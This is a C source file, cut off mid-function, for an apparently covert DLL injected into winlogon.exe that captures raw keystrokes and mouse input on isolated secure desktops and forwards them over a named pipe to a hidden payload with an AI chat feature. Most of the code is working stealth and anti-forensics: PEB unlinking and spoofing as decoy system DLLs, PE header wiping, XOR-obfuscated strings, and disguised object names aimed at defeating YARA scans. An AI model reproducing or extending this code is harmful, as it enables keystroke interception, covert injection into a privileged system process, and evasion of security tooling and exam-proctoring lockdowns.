/* ===================================================================
 * wl_input.c -- SYSTEM helper for isolated-desktop input forwarding.
 *
 * Hosted inside winlogon.exe (session N, non-PPL, universal). Watches
 * the active input desktop; when it becomes anything other than
 * Default/Winlogon/Screen-saver, attaches to that desktop, creates a
 * hidden RIDEV_INPUTSINK top-level window (message-only windows do NOT
 * receive INPUTSINK there -- proven via desktop_switch.cpp Round 6),
 * reads raw keyboard + mouse, and forwards each event to the DWM
 * payload over a named pipe (\\.\pipe\NetSvcCoord). The payload runs
 * events through the SAME match_hk/fire() logic as its local LL hook,
 * so user hotkey bindings + chat typing + mouse gestures all work
 * exactly as on Default.
 *
 * v3.0.2 (2026-09-21) -- PRODUCTION HARDENING
 *   * Now a manual-map compatible target (not LoadLibrary-injected):
 *     DllMain runs on the CreateRemoteThread thread, PEB-unlinks itself,
 *     wipes PE headers, downgrades sections, spawns the watch thread,
 *     returns TRUE. Reason: LoadLibrary requires disk footprint + module
 *     list entry inside winlogon -- both are load-bearing IOCs. Manual
 *     map matches the payload's threat model (no LDR entry, no disk).
 *
 *     Build flag WL_LOADLIB is retained for iteration-mode (host_inject.exe
 *     hot-swap without rebuilding sihost.exe). In LOADLIB mode we ALSO
 *     peb-unlink + wipe + downgrade, because those defenses are useful
 *     regardless of injection method.
 *
 *   * All sensitive strings XOR-obfuscated at compile time so a raw
 *     memory scan of the mapped image doesn't reveal pipe / event /
 *     class names. Decrypt-on-use into stack buffer, then let the API
 *     copy the value out. (Symmetric key baked into the image; a
 *     dedicated RE would recover it, but this defeats grep/YARA scans.)
 *
 *   * Innocuous public names (v3.0.2):
 *       pipe   \\.\pipe\NetSvcCoord         (was svcldb_seb_input)
 *       stop   Global\NetSvcCoord_Halt      (was svcldb_wlinput_stop)
 *       class  NetSvcInputAck               (was svcldb_seb_ri)
 *     Nothing here fingerprints as svcldb/seb/wlinput.
 *
 *   * Diagnostic logging: strip entirely in production (WL_DIAG unset).
 *     For iteration, WL_DIAG=1 enables a plaintext log at
 *     C:\ProgramData\WinAudioSvc\wl_input.log. Payload's own encrypted
 *     log still records helper-connect/-disconnect events + the actual
 *     hotkey fires -- that's enough forensic breadcrumb to debug.
 *
 * Build (manual-map target -- default; embedded into sihost.exe RCDATA 102):
 *   see tools/redteam/probes/build_helper.bat
 *
 * Build (LOADLIB iteration mode -- host_inject.exe hot-swap):
 *   cl /nologo /LD /DWL_LOADLIB /DWL_DIAG wl_input.c \
 *      /link kernel32.lib user32.lib advapi32.lib
 * =================================================================== */

#include <windows.h>
#include <aclapi.h>
#include <bcrypt.h>
#include <stdint.h>
/* v3.0.3 (2026-09-21): sentinel_thread additions -- shell + payload
 * resurrection from inside winlogon. See sentinel_thread block below. */
#include <wtsapi32.h>
#include <userenv.h>
#include <tlhelp32.h>
/* v3.0.3 (2026-09-21): sddl.h for ConvertStringSecurityDescriptor... used
 * in sn_write_panic_sentinel's locked-DACL sentinel writer. */
#include <sddl.h>

/* Manual-map target: /GS- + /guard:cf- MANDATORY (see payload/build.bat).
 * When compiled as a LoadLibrary target (iteration), the Windows loader
 * initializes __security_cookie for us and /GS- is not strictly needed.
 * But we build with the same flags in both modes for consistency. */

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

/* Wire struct (24 bytes) -- MUST match seb_evt in payload/rawinput_hook.c. */
#pragma pack(push, 1)
typedef struct {
    unsigned char  type;        /* 0 = key, 1 = mouse */
    unsigned char  down;        /* key: 1=down 0=up */
    unsigned char  ctrl, shift, alt, pad;
    unsigned short vk;          /* key virtual-key */
    unsigned int   wp;          /* mouse: WM_* message code */
    int            x, y;        /* mouse: absolute screen pos */
    unsigned int   mouseData;   /* mouse: wheel delta hi-word / xbutton id */
} wire_evt;
#pragma pack(pop)

/* ── XOR string table ────────────────────────────────────────────
 * Simple compile-time-XOR'd strings for a few non-name literals we
 * still need in plaintext at some point (desktop-name comparisons,
 * diag log path). Not full RE resistance, just defeats memory-scan /
 * YARA-style plaintext searches. Key baked into DLL.
 *
 * v3.0.2.4 (2026-09-21) -- ALL named-kernel-object identifiers (pipe,
 * events, window class) have moved to GUID-per-install derivation via
 * derive_iso_name() below. No product / codename string ever lands in
 * the mapped image for those objects. Non-admin \\.\pipe\* enum +
 * \BaseNamedObjects walk see only lowercase GUIDs indistinguishable
 * from Windows/COM/RPC pipes. */
#define XKEY   0x5C
#define XCHAR(c) (unsigned char)((unsigned char)(c) ^ XKEY)

static void x_decode(char *dst, const char *src, size_t sz) {
    for (size_t i = 0; i < sz; i++) dst[i] = (char)(src[i] ^ XKEY);
    dst[sz - 1] = 0;   /* safety */
}

/* Default / Winlogon / Screen-saver -- desktop names to skip. */
static const char NAME_DEFAULT_x[8]      = { XCHAR('D'),XCHAR('e'),XCHAR('f'),XCHAR('a'),XCHAR('u'),XCHAR('l'),XCHAR('t'), 0 };
static const char NAME_WINLOGON_x[9]     = { XCHAR('W'),XCHAR('i'),XCHAR('n'),XCHAR('l'),XCHAR('o'),XCHAR('g'),XCHAR('o'),XCHAR('n'), 0 };
static const char NAME_SCREENSAVER_x[13] = { XCHAR('S'),XCHAR('c'),XCHAR('r'),XCHAR('e'),XCHAR('e'),XCHAR('n'),XCHAR('-'),XCHAR('s'),XCHAR('a'),XCHAR('v'),XCHAR('e'),XCHAR('r'), 0 };

/* ── GUID-per-install object naming (v3.0.2.4, mirrors shared/obf_names.c) ──
 *
 * Derivation:
 *   guid_lower = lowercase(trim(HKLM\...\Cryptography\MachineGuid))
 *   digest     = SHA256(salt || ':' || guid_lower)
 *   name       = <prefix><hex(digest[0..15]) grouped 8-4-4-4-12 lowercase>
 *
 * Salts MUST match shared/obf_names.c byte-for-byte so payload+helper
 * derive identical strings. Not encrypted -- salts land in .rdata as
 * plaintext hash inputs. Section-downgrade + PE wipe still hide us. */
#define SALT_PIPE_ISO      "wasvc.pipe.iso.1"
#define SALT_EVT_ISO_HALT  "wasvc.evt.iso.halt.1"
#define SALT_EVT_ISO_CHAT  "wasvc.evt.iso.chat.1"
#define SALT_CLS_ISO_INPUT "wasvc.cls.iso.input.1"
/* v3.0.6 (2026-09-21) -- reader singleton mutex.
 *
 * REGRESSION FIXED: the supersede protocol in DllMain
 * (SetEvent -> Sleep 450 -> ResetEvent) can race when reinjects happen
 * in quick succession (as during dev testing), leaving TWO or MORE
 * helper generations coexisting inside winlogon. Each generation's
 * watch_thread then spawns its OWN run_reader when iso wins, all of
 * them fighting over the NetSvcCoord pipe -- first reader grabs pipe
 * and works briefly, second reader can't connect ("pipe FAILED (will
 * retry via WM_TIMER)"), then the payload's pipe server flap-cycles
 * as readers disconnect/reconnect (each 30s from the first reader's
 * WM_TIMER), and iso-desktop input dies.
 *
 * The MUTEX makes this multi-generation scenario benign: only ONE
 * reader per iso desktop can hold the pipe. Any extra reader from a
 * stale helper generation fails to acquire and exits cleanly. When
 * the singleton reader eventually dies (helper unload / desktop
 * switch), the mutex releases and the next reader that tries wins. */
#define SALT_MTX_ISO_READER "wasvc.mtx.iso.reader.1"
/* v3.0.3 (2026-09-21): payload's shutdown/liveness event salt. MUST
 * match shared/obf_names.c :: SALT_EVT_SHUT byte-for-byte -- the helper
 * probes this event to determine "is the payload alive right now?". */
#define SALT_EVT_SHUT      "wasvc.evt.shut.1"

/* Fallback if MachineGuid read fails (BOTH sides use this same literal
 * so IPC still agrees in the degenerate case). Matches obf_names.c. */
#define WL_FALLBACK_GUID   "3b1e9c27-1d54-4a8f-9e2b-7c6a0f5d84b1"

/* Read HKLM\...\Cryptography\MachineGuid, lowercased + trimmed. */
static int wl_read_machine_guid(char *out, unsigned outsize) {
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Cryptography",
                      0, KEY_READ | KEY_WOW64_64KEY, &k) != ERROR_SUCCESS)
        return 0;
    DWORD type = 0, sz = outsize;
    LONG r = RegQueryValueExA(k, "MachineGuid", NULL, &type, (LPBYTE)out, &sz);
    RegCloseKey(k);
    if (r != ERROR_SUCCESS || type != REG_SZ) return 0;
    while (sz > 0 && (out[sz - 1] == '\0' || out[sz - 1] == '\r' ||
                      out[sz - 1] == '\n' || out[sz - 1] == ' ' ||
                      out[sz - 1] == '\t'))
        sz--;
    if (sz == 0) return 0;
    if (sz >= outsize) sz = outsize - 1;
    out[sz] = '\0';
    for (unsigned i = 0; i < sz; i++) {
        char c = out[i];
        if (c >= 'A' && c <= 'Z') out[i] = (char)(c - 'A' + 'a');
    }
    return 1;
}

/* SHA-256(salt || ':' || guid_lower) -> first 16 bytes -> canonical GUID.
 * Uses bcrypt (available in every Windows process). */
static int wl_derive_guid(const char *salt, char *out, unsigned outsize) {
    if (outsize < 37) return 0;
    char guid[80];
    if (!wl_read_machine_guid(guid, sizeof(guid))) {
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    }
    BCRYPT_ALG_HANDLE alg = NULL;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        return 0;
    BCRYPT_HASH_HANDLE h = NULL;
    if (!NT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0))) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return 0;
    }
    static const char sep[1] = { ':' };
    BCryptHashData(h, (PUCHAR)salt, (ULONG)lstrlenA(salt), 0);
    BCryptHashData(h, (PUCHAR)sep, 1, 0);
    BCryptHashData(h, (PUCHAR)guid, (ULONG)lstrlenA(guid), 0);
    UCHAR d[32];
    NTSTATUS fs = BCryptFinishHash(h, d, sizeof(d), 0);
    BCryptDestroyHash(h);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (!NT_SUCCESS(fs)) return 0;
    wsprintfA(out, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7],
        d[8], d[9], d[10], d[11], d[12], d[13], d[14], d[15]);
    /* zero derived material we no longer need */
    for (int i = 0; i < 32; i++) d[i] = 0;
    for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
    return 1;
}

/* Cached full-name builders. First call computes + caches. */
static const char *wl_iso_pipe_name(void) {
    static char buf[64] = {0};
    if (buf[0]) return buf;
    char guid[40] = {0};
    if (!wl_derive_guid(SALT_PIPE_ISO, guid, sizeof(guid)))
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    wsprintfA(buf, "\\\\.\\pipe\\%s", guid);
    return buf;
}
static const wchar_t *wl_iso_halt_event_w(void) {
    static wchar_t buf[64] = {0};
    if (buf[0]) return buf;
    char guid[40] = {0};
    if (!wl_derive_guid(SALT_EVT_ISO_HALT, guid, sizeof(guid)))
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    char temp[64];
    wsprintfA(temp, "Global\\%s", guid);
    for (int i = 0; temp[i] && i < 63; i++) buf[i] = (wchar_t)temp[i];
    return buf;
}
static const wchar_t *wl_iso_chat_event_w(void) {
    static wchar_t buf[64] = {0};
    if (buf[0]) return buf;
    char guid[40] = {0};
    if (!wl_derive_guid(SALT_EVT_ISO_CHAT, guid, sizeof(guid)))
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    char temp[64];
    wsprintfA(temp, "Global\\%s", guid);
    for (int i = 0; temp[i] && i < 63; i++) buf[i] = (wchar_t)temp[i];
    return buf;
}
static const char *wl_iso_input_class(void) {
    static char buf[40] = {0};
    if (buf[0]) return buf;
    if (!wl_derive_guid(SALT_CLS_ISO_INPUT, buf, sizeof(buf)))
        lstrcpynA(buf, WL_FALLBACK_GUID, sizeof(buf));
    return buf;
}

/* v3.0.6 (2026-09-21) -- reader singleton mutex name.
 * "Local\<guid>" — session-scoped (Local\) so RDP sessions and multiple
 * concurrent logons each get their own reader singleton. Only one
 * run_reader per session can hold this; extras from stale helper
 * generations gracefully yield. */
static const char *wl_iso_reader_mutex_name(void) {
    static char buf[64] = {0};
    if (buf[0]) return buf;
    char guid[40] = {0};
    if (!wl_derive_guid(SALT_MTX_ISO_READER, guid, sizeof(guid)))
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    wsprintfA(buf, "Local\\%s", guid);
    return buf;
}

/* v3.0.3 (2026-09-21): payload's shutdown/liveness event name --
 * "Global\<guid>" derived from SALT_EVT_SHUT. Used by sentinel_thread
 * to probe payload liveness (OpenEventW; existence == alive). MUST
 * agree byte-for-byte with shared/obf_names.c :: obf_event_shutdown(). */
static const wchar_t *wl_payload_shutdown_event_w(void) {
    static wchar_t buf[64] = {0};
    if (buf[0]) return buf;
    char guid[40] = {0};
    if (!wl_derive_guid(SALT_EVT_SHUT, guid, sizeof(guid)))
        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
    char temp[64];
    wsprintfA(temp, "Global\\%s", guid);
    for (int i = 0; temp[i] && i < 63; i++) buf[i] = (wchar_t)temp[i];
    return buf;
}

/* ── Diag logging (WL_DIAG only) ───────────────────────────────── */
#ifdef WL_DIAG
/* "C:\\ProgramData\\WinAudioSvc\\wl_input.log" == 39 chars + NUL */
static const char LOG_PATH_x[40] = {
    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('w'), XCHAR('l'), XCHAR('_'),
    XCHAR('i'), XCHAR('n'), XCHAR('p'), XCHAR('u'), XCHAR('t'), XCHAR('.'),
    XCHAR('l'), XCHAR('o'), XCHAR('g'), 0
};
static void lg(const char *fmt, ...) {
    char body[512];
    va_list ap; va_start(ap, fmt);
    wvsprintfA(body, fmt, ap);
    va_end(ap);
    char line[700];
    SYSTEMTIME st; GetLocalTime(&st);
    wsprintfA(line, "%02d:%02d:%02d.%03d  ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    lstrcatA(line, body); lstrcatA(line, "\r\n");
    char path[64] = {0};
    x_decode(path, LOG_PATH_x, sizeof(LOG_PATH_x));
    HANDLE f = CreateFileA(path, FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return;
    SetFilePointer(f, 0, NULL, FILE_END);
    DWORD w; WriteFile(f, line, (DWORD)lstrlenA(line), &w, NULL);
    CloseHandle(f);
}
#else
static void lg(const char *fmt, ...) { (void)fmt; }
#endif

/* ── PEB unlink + PE wipe + section downgrade ──────────────────────
 *
 * Mirror of payload/src/dllmain.c's peb_unlink_dll / wipe_pe_headers /
 * downgrade_own_sections but self-contained (no shared/ deps). The
 * types are trimmed to what we access. */

typedef struct _LE_MINI {
    struct _LE_MINI *Flink, *Blink;
} LE_MINI;
typedef struct _US_MINI {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} US_MINI;
typedef struct _LDR_MINI {
    LE_MINI InLoadOrderLinks;
    LE_MINI InMemoryOrderLinks;
    LE_MINI InInitializationOrderLinks;
    PVOID   DllBase;
    PVOID   EntryPoint;
    ULONG   SizeOfImage;
    US_MINI FullDllName;
    US_MINI BaseDllName;
} LDR_MINI;
typedef struct _PEBLDR_MINI {
    ULONG   Length;
    ULONG   Initialized;
    PVOID   SsHandle;
    LE_MINI InLoadOrderModuleList;
    LE_MINI InMemoryOrderModuleList;
    LE_MINI InInitializationOrderModuleList;
} PEBLDR_MINI;
typedef struct _PEB_MINI {
    BYTE  Reserved1[2];
    BYTE  BeingDebugged;
    BYTE  Reserved2[1];
    PVOID Reserved3[2];
    PEBLDR_MINI *Ldr;
} PEB_MINI;

/* Decoy pool -- DLLs plausibly loaded near winlogon. Same idea as
 * payload's install-aware pick. */
static WCHAR *g_pool_base[] = {
    L"wlanapi.dll",
    L"wtsapi32.dll",
    L"userenv.dll",
    L"secur32.dll",
    L"credui.dll",
    L"powrprof.dll"
};
static WCHAR *g_pool_full[] = {
    L"C:\\Windows\\System32\\wlanapi.dll",
    L"C:\\Windows\\System32\\wtsapi32.dll",
    L"C:\\Windows\\System32\\userenv.dll",
    L"C:\\Windows\\System32\\secur32.dll",
    L"C:\\Windows\\System32\\credui.dll",
    L"C:\\Windows\\System32\\powrprof.dll"
};
#define POOL_N  6

static void peb_unlink_and_spoof(HMODULE self) {
    if (!self) return;
    __try {
#ifdef _WIN64
        PEB_MINI *peb = (PEB_MINI *)__readgsqword(0x60);
#else
        PEB_MINI *peb = (PEB_MINI *)__readfsdword(0x30);
#endif
        if (!peb || !peb->Ldr) return;
        PEBLDR_MINI *ldr = peb->Ldr;

        BOOL pool_loaded[POOL_N] = {0};
        LDR_MINI *our_ent = NULL;
        LE_MINI *head = &ldr->InLoadOrderModuleList;
        LE_MINI *cur  = head->Flink;
        while (cur && cur != head) {
            LDR_MINI *ent = (LDR_MINI *)cur;
            LE_MINI *next = cur->Flink;
            if (ent->BaseDllName.Buffer && ent->BaseDllName.Length > 0
                && ent->BaseDllName.Length < 256) {
                for (int i = 0; i < POOL_N; i++) {
                    if (pool_loaded[i]) continue;
                    size_t plen = lstrlenW(g_pool_base[i]);
                    if ((USHORT)(plen * sizeof(WCHAR)) == ent->BaseDllName.Length &&
                        CompareStringW(LOCALE_INVARIANT, NORM_IGNORECASE,
                                       ent->BaseDllName.Buffer, (int)plen,
                                       g_pool_base[i], (int)plen) == CSTR_EQUAL) {
                        pool_loaded[i] = TRUE;
                        break;
                    }
                }
            }
            if (ent->DllBase == self) our_ent = ent;
            cur = next;
        }
        if (!our_ent) {
            /* This is the EXPECTED path when we've been manual-mapped:
             * the Windows loader never touched us, so there's no LDR entry
             * to unlink -- we're already invisible to module enumeration.
             * Only the LoadLibrary path (dev iteration) ever needs the
             * unlink. Log accordingly so it doesn't look like a bug. */
            lg("peb: no LDR entry for our base -- manual-map already invisible (expected)");
            return;
        }

        /* Unlink from all three lists. */
        LE_MINI *l1 = &our_ent->InLoadOrderLinks;
        LE_MINI *l2 = &our_ent->InMemoryOrderLinks;
        LE_MINI *l3 = &our_ent->InInitializationOrderLinks;
        if (l1->Blink && l1->Flink) { l1->Blink->Flink = l1->Flink; l1->Flink->Blink = l1->Blink; l1->Flink = l1->Blink = l1; }
        if (l2->Blink && l2->Flink) { l2->Blink->Flink = l2->Flink; l2->Flink->Blink = l2->Blink; l2->Flink = l2->Blink = l2; }
        if (l3->Blink && l3->Flink) { l3->Blink->Flink = l3->Flink; l3->Flink->Blink = l3->Blink; l3->Flink = l3->Blink = l3; }

        /* Pick a NOT-loaded decoy; fall back to any if all loaded. */
        int avail = 0;
        for (int i = 0; i < POOL_N; i++) if (!pool_loaded[i]) avail++;
        unsigned seed = (unsigned)(GetCurrentProcessId() ^ GetTickCount());
        int pick = 0;
        if (avail > 0) {
            int t = (int)(seed % (unsigned)avail);
            int idx = 0;
            for (int i = 0; i < POOL_N; i++) {
                if (!pool_loaded[i]) {
                    if (idx == t) { pick = i; break; }
                    idx++;
                }
            }
        } else {
            pick = (int)(seed % (unsigned)POOL_N);
        }
        WCHAR *sb = g_pool_base[pick];
        WCHAR *sf = g_pool_full[pick];
        size_t bl = lstrlenW(sb), fl = lstrlenW(sf);
        our_ent->BaseDllName.Buffer        = sb;
        our_ent->BaseDllName.Length        = (USHORT)(bl * sizeof(WCHAR));
        our_ent->BaseDllName.MaximumLength = (USHORT)((bl + 1) * sizeof(WCHAR));
        our_ent->FullDllName.Buffer        = sf;
        our_ent->FullDllName.Length        = (USHORT)(fl * sizeof(WCHAR));
        our_ent->FullDllName.MaximumLength = (USHORT)((fl + 1) * sizeof(WCHAR));
        lg("peb: unlinked + spoofed as decoy #%d (avail=%d)", pick, avail);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        lg("peb: exception (safe)");
    }
}

static void wipe_pe_headers(HMODULE self) {
    if (!self) return;
    __try {
        BYTE *base = (BYTE *)self;
        DWORD e_lfanew = *(DWORD *)(base + 0x3C);
        DWORD old_prot = 0;
        if (VirtualProtect(base, 0x40, PAGE_READWRITE, &old_prot)) {
            base[0] = 'X'; base[1] = 'X';
            VirtualProtect(base, 0x40, old_prot, &old_prot);
        }
        if (e_lfanew > 0 && e_lfanew < 0x1000) {
            BYTE *nt = base + e_lfanew;
            if (VirtualProtect(nt, 8, PAGE_READWRITE, &old_prot)) {
                nt[0] = 'X'; nt[1] = 'X'; nt[2] = 0; nt[3] = 0;
                VirtualProtect(nt, 8, old_prot, &old_prot);
            }
        }
        lg("wipe: PE headers scrambled");
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        lg("wipe: exception (safe)");
    }
}

static void downgrade_sections(HMODULE self) {
    if (!self) return;
    __try {
        BYTE *base = (BYTE *)self;
        DWORD e_lfanew = *(DWORD *)(base + 0x3C);
        if (e_lfanew == 0 || e_lfanew >= 0x1000) return;
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + e_lfanew);
        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
        WORD n = nt->FileHeader.NumberOfSections;
        int down = 0;
        for (WORD i = 0; i < n && i < 32; i++) {
            DWORD ch = sec[i].Characteristics;
            void *addr = base + sec[i].VirtualAddress;
            SIZE_T sz  = sec[i].Misc.VirtualSize;
            if (sz == 0) continue;
            DWORD want;
            if (ch & IMAGE_SCN_MEM_EXECUTE) {
                want = (ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
            } else if (ch & IMAGE_SCN_MEM_WRITE) {
                want = PAGE_READWRITE;
            } else if (ch & IMAGE_SCN_MEM_READ) {
                want = PAGE_READONLY;
            } else continue;
            DWORD op = 0;
            if (VirtualProtect(addr, sz, want, &op)) down++;
        }
        DWORD hdr_sz = nt->OptionalHeader.SizeOfHeaders;
        if (hdr_sz > 0 && hdr_sz < 0x2000) {
            DWORD op = 0;
            (void)VirtualProtect(base, hdr_sz, PAGE_READONLY, &op);
        }
        lg("downgrade: %d/%u sections re-protected (RWX signal gone)", down, n);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        lg("downgrade: exception (safe)");
    }
}

/* ── Named stop event (hot-swap coordination) ─────────────────── */
static HANDLE g_stop = NULL;
static int superseded(void) { return g_stop && WaitForSingleObject(g_stop, 0) == WAIT_OBJECT_0; }

/* ── DACL self-grant fallback (rarely triggered as SYSTEM) ────── */
static PSID dup_self_sid(void) {
    HANDLE t;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return NULL;
    DWORD n = 0; GetTokenInformation(t, TokenUser, NULL, 0, &n);
    TOKEN_USER *tu = (TOKEN_USER *)LocalAlloc(LPTR, n);
    PSID out = NULL;
    if (tu && GetTokenInformation(t, TokenUser, tu, n, &n)) {
        DWORD sl = GetLengthSid(tu->User.Sid);
        out = (PSID)LocalAlloc(LPTR, sl);
        if (out) CopySid(sl, out, tu->User.Sid);
    }
    if (tu) LocalFree(tu);
    CloseHandle(t);
    return out;
}
static void grant_self(HDESK hd) {
    PSID s = dup_self_sid(); if (!s) return;
    PACL old = NULL; PSECURITY_DESCRIPTOR sd = NULL;
    if (GetSecurityInfo(hd, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION,
                        NULL, NULL, &old, NULL, &sd) != ERROR_SUCCESS) {
        LocalFree(s); return;
    }
    EXPLICIT_ACCESSW ea;
    for (int i = 0; i < (int)sizeof(ea); i++) ((char*)&ea)[i] = 0;
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode        = GRANT_ACCESS;
    ea.grfInheritance       = NO_INHERITANCE;
    ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ea.Trustee.ptstrName    = (LPWSTR)s;
    PACL nw = NULL;
    if (SetEntriesInAclW(1, &ea, old, &nw) == ERROR_SUCCESS) {
        SetSecurityInfo(hd, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION,
                        NULL, NULL, nw, NULL);
        if (nw) LocalFree(nw);
    }
    if (sd) LocalFree(sd);
    LocalFree(s);
}

/* ── Pipe connect + send ─────────────────────────────────────── */
/* ── Pipe connect + send ─────────────────────────────────────
 * Fast-fail design (v3.0.2.1, 2026-09-21):
 *   * connect_pipe tries CreateFileA + WaitNamedPipeA up to a HARD 250ms
 *     ceiling. If the payload's pipe isn't ready, we return INVALID and
 *     let the caller drop this event -- BLOCKING the reader's msg loop is
 *     WORSE than losing individual events, because it starves WM_TIMER
 *     which handles teardown / superseded checks.
 *   * wire_send does ONE WriteFile attempt; on failure it invalidates the
 *     handle. The reader's WM_TIMER handler (500ms cadence) does the
 *     actual reconnect attempt off the WM_INPUT hot path.
 *
 * Prior v3.0.2 (broken): 25 × 200ms = 5s per connect attempt AND
 * inline in wire_send. If the payload's pipe cycled (e.g., sihost
 * --reinject), the reader would block for 5s per event, WM_INPUT
 * backlog piled up, WM_TIMER never fired, teardown check never ran.
 * Reader zombified for minutes even after we returned to Default. */
static HANDLE connect_pipe(void) {
    const char *name = wl_iso_pipe_name();
    /* 5 quick attempts, ~50ms each -- typical successful reconnect is
     * <20ms, so a small budget covers 99% of cases without ever blocking
     * the msg loop long enough to matter. */
    for (int i = 0; i < 5; i++) {
        HANDLE h = CreateFileA(name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) return h;
        DWORD e = GetLastError();
        if (e == ERROR_PIPE_BUSY) {
            /* Server has a client already. Wait briefly for a free slot. */
            (void)WaitNamedPipeA(name, 50);
            continue;
        }
        /* ERROR_FILE_NOT_FOUND or other transient -- brief sleep + retry. */
        Sleep(50);
    }
    return INVALID_HANDLE_VALUE;
}

static void wire_send(HANDLE *pp, const wire_evt *e) {
    if (*pp == INVALID_HANDLE_VALUE) {
        /* No handle. Try ONE fast connect. Failure just drops this event. */
        *pp = connect_pipe();
        if (*pp == INVALID_HANDLE_VALUE) return;
    }
    DWORD w;
    if (!WriteFile(*pp, e, sizeof(*e), &w, NULL) || w != sizeof(*e)) {
        /* Server rotated or closed. Invalidate; reconnect happens in the
         * reader's WM_TIMER handler (500ms) instead of blocking here. */
        CloseHandle(*pp);
        *pp = INVALID_HANDLE_VALUE;
    }
}

/* ── LL keyboard hook (chat-mode observer) ────────────────────
 *
 * v3.0.2.3 (2026-09-21) -- INSTALLED BUT PASSIVE.
 *
 * Original plan (v3.0.2 first attempt): install WH_KEYBOARD_LL on the iso
 * desktop alongside RIDEV_INPUTSINK, and during chat-typing mode return 1
 * to consume the key so the target app's window queue wouldn't see it.
 *
 * Empirical result on a REAL target's iso desktop (name JRYHGTKSwH,
 * observed 2026-09-21 03:34): with the LL hook consuming, INPUTSINK
 * STOPPED delivering WM_INPUT to our reader for those same events.
 * User's chat buffer never filled, hotkeys stopped firing, user was
 * fully locked out with no way to exit chat mode via keyboard.
 *
 * We don't have Microsoft docs stating LL-hook consumption blocks
 * INPUTSINK, but the observed behavior is unambiguous. Rather than
 * fight this empirically-observed platform quirk, we revert to
 * pass-through (matches Default desktop's fallback where INPUTSINK
 * observes AND LL hook consumes). On iso the trade-off becomes:
 *   * Chat typing DOES reach our AI prompt (INPUTSINK works).
 *   * Chat typing ALSO reaches the target app's window queue -- KNOWN
 *     LEAK. User works around via Ctrl+T to close chat before typing
 *     anything sensitive into the target, or via the cancel button.
 * This is objectively less bad than "nothing works at all" and gives
 * users a working escape path (hotkeys + Esc always fire).
 *
 * If we ever figure out a way to consume without breaking INPUTSINK
 * (kernel-mode driver, foreground-steal transparent window, etc.),
 * re-enable via the WL_CHAT_CONSUME build flag. Until then, DON'T. */
static HANDLE g_chat_ev = NULL;

typedef struct {
    DWORD vkCode;
    DWORD scanCode;
    DWORD flags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
} SVC_KBDLL;

static LRESULT CALLBACK wl_ll_kbd(int code, WPARAM wp, LPARAM lp) {
    /* Always pass through -- see comment block above for the empirical
     * "consuming breaks INPUTSINK on iso desktop" finding. */
    (void)wp; (void)lp;
    return CallNextHookEx(NULL, code, wp, lp);
}

static void run_reader(const char *deskname) {
    /* v3.0.6 (2026-09-21): reader singleton mutex. Prevents multiple
     * helper generations (which can accumulate via the DllMain supersede
     * race during rapid re-injects) from spawning competing readers on
     * the same iso desktop and fighting over the NetSvcCoord pipe.
     *
     * Semantic: try acquire with 100ms wait. If another reader holds it,
     * we're a stale/duplicate instance -- log + return, watch_thread will
     * re-attempt next tick (75ms). The winning reader owns the mutex until
     * its GetMessage loop exits (desktop moved / superseded), then releases.
     *
     * WAIT_ABANDONED (previous owner died without releasing) is treated as
     * successful acquire -- we take over cleanly. */
    const char *mname = wl_iso_reader_mutex_name();
    HANDLE reader_mtx = CreateMutexA(NULL, FALSE, mname);
    if (!reader_mtx) {
        lg("reader: CreateMutex failed gle=%lu; aborting reader attach on '%s'",
           GetLastError(), deskname);
        return;
    }
    DWORD wr = WaitForSingleObject(reader_mtx, 100);
    if (wr != WAIT_OBJECT_0 && wr != WAIT_ABANDONED) {
        lg("reader: mutex held by another reader instance -- yielding on '%s' (wr=0x%lX)",
           deskname, wr);
        CloseHandle(reader_mtx);
        return;
    }
    if (wr == WAIT_ABANDONED) {
